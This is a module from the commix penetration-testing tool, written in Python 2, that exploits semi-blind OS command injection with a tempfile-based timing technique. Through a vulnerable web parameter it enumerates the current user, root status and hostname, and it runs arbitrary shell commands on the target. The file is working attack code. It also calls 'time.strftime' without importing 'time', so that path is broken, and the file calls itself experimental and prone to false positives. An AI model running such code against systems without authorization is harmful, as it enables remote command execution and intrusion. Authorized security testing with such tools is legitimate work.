#!/usr/bin/env python
# encoding: UTF-8

"""
 This file is part of commix (@commixproject) tool.
 Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 For more see the file 'readme/COPYING' for copying permission.
"""

import sys

from src.utils import menu
from src.utils import colors
from src.utils import settings

from src.core.injections.semiblind_based.techniques.tempfile_based import tfb_injector

"""
 The "tempfile-based" injection technique on Semiblind OS Command Injection.
 __Warning:__ This technique is still experimental, is not yet fully functional and may leads to false-positive resutls.
"""

def do_check(separator,maxlen,TAG,delay,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell):

  # Current user enumeration
  if menu.options.current_user:
    cmd = settings.CURRENT_USER
    check_how_long,output  = tfb_injector.injection(separator,maxlen,TAG,cmd,delay,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
    print "\n\n" + "  (+) Current User : "+ colors.YELLOW + colors.BOLD + output + colors.RESET + ""

  # Is-root enumeration
  if menu.options.is_root:
    cmd = settings.ISROOT
    check_how_long,output  = tfb_injector.injection(separator,maxlen,TAG,cmd,delay,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
    sys.stdout.write( "\n\n" + "  (+) Current user have root privs :")
    sys.stdout.flush()
    if output != "0":
      print colors.RED + " FALSE " + colors.RESET
    else:
      print colors.GREEN + " TRUE " + colors.RESET 

  # Hostname enumeration
  if menu.options.hostname:
    cmd = settings.HOSTNAME
    check_how_long,output  = tfb_injector.injection(separator,maxlen,TAG,cmd,delay,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
    print "\n\n" + "  (+) Hostname : "+ colors.YELLOW + colors.BOLD +  output + colors.RESET + ""

  # Single os-shell execution
  if menu.options.os_shell:
    cmd =  menu.options.os_shell
    check_how_long,output  = tfb_injector.injection(separator,maxlen,TAG,cmd,delay,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
    if menu.options.verbose:
      print ""
    print "\n\n" + colors.GREEN + colors.BOLD + output + colors.RESET
    print "\n(*) Finished in "+ time.strftime('%H:%M:%S', time.gmtime(check_how_long)) +".\n"
    sys.exit(0)
    
# eof